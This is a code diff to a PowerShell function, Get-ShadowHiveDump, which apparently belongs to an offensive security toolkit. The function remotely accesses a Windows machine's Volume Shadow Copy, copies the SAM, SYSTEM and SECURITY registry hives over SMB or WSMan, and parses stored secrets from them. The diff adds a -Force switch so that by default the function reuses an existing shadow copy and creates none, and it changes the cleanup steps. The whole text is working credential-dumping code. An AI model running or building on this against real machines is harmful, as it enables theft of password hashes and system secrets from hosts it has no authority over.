@@ -24,6 +24,9 @@ Function Get-ShadowHiveDump {
 .PARAMETER Protocol
     Specifies the protocol to use, defaults to DCOM.
 
+.PARAMETER Force
+    Enables shadow copy creation in order to get an up-to-date dump.
+
 .EXAMPLE
     PS C:\> Get-ShadowHiveDump -ComputerName SRV.ADATUM.CORP
 
@@ -48,7 +51,10 @@ Function Get-ShadowHiveDump {
 
         [ValidateSet('Dcom', 'Wsman')]
         [String]
-        $Protocol = 'Dcom'
+        $Protocol = 'Dcom',
+
+        [Switch]
+        $Force
     )
 
     BEGIN {
@@ -99,9 +105,21 @@ Function Get-ShadowHiveDump {
     }
 
     PROCESS {
-        Write-Verbose "[$ComputerName] Creating a shadow copy of volume 'C:\'"
-        $process = Invoke-CimMethod -ClassName Win32_ShadowCopy -Name Create -Arguments @{Context="ClientAccessible"; Volume="C:\"} -CimSession $cimSession -ErrorAction Stop -Verbose:$false
-        $shadowCopy = Get-CimInstance -ClassName Win32_ShadowCopy -Filter "ID='$($process.ShadowID)'" -CimSession $cimSession -Verbose:$false
+        if ($Force) {
+            Write-Verbose "[$ComputerName] Creating a shadow copy of volume 'C:\'"
+            $process = Invoke-CimMethod -ClassName Win32_ShadowCopy -Name Create -Arguments @{Context="ClientAccessible"; Volume="C:\"} -CimSession $cimSession -ErrorAction Stop -Verbose:$false
+            $shadowCopy = Get-CimInstance -ClassName Win32_ShadowCopy -Filter "ID='$($process.ShadowID)'" -CimSession $cimSession -Verbose:$false
+        }
+        else {
+            Write-Verbose "[$ComputerName] Getting the latest shadow copy of volume 'C:\'"
+            $deviceID = (Get-CimInstance -ClassName Win32_Volume -Filter "DriveLetter='C:'" -CimSession $cimSession -ErrorAction Stop -Verbose:$false).DeviceID
+            $shadowCopy = Get-CimInstance -ClassName Win32_ShadowCopy -CimSession $cimSession -Verbose:$false | Where-Object {$_.VolumeName -eq $deviceID} | Sort-Object InstallDate | Select-Object -Last 1
+        }
+        if (-not $shadowCopy) {
+            Write-Warning "[$ComputerName] No shadow copy available. Please retry with switch '-Force'"
+            break
+        }
+
         if ($Protocol -eq 'Wsman') {
             $deviceObject = $shadowCopy.DeviceObject.ToString()
             $tempDir = "C:\Windows\Temp\dump"
@@ -150,7 +168,7 @@ Function Get-ShadowHiveDump {
             Copy-Item -Path "$securityBackupPath" -Destination "$outputDirectory" -FromSession $psSession
 
             # Delete the shadow link
-            Get-CimInstance -ClassName CIM_LogicalFile -Filter "Name='$($tempDir -Replace '\\','\\')'" -CimSession $cimSession -Verbose:$false | Remove-CimInstance
+            Get-CimInstance -ClassName CIM_LogicalFile -Filter "Name='$($tempDir -Replace '\\','\\')'" -CimSession $cimSession -Verbose:$false | Remove-CimInstance -Verbose:$false
         }
         else {
             # Download files via SMB
@@ -170,8 +188,10 @@ Function Get-ShadowHiveDump {
             }
         }
 
-        Write-Verbose "[$ComputerName] Cleaning up the shadow copy"
-        $shadowCopy | Remove-CimInstance -Verbose:$false
+        if ($Force) {
+            Write-Verbose "[$ComputerName] Cleaning up the shadow copy"
+            $shadowCopy | Remove-CimInstance -CimSession $cimSession -Verbose:$false
+        }
 
         Write-Verbose "[$ComputerName] Extracting secrets from hive copy"
         [HiveParser]::ParseSecrets("$outputDirectory\SAM", "$outputDirectory\SYSTEM", "$outputDirectory\SECURITY")
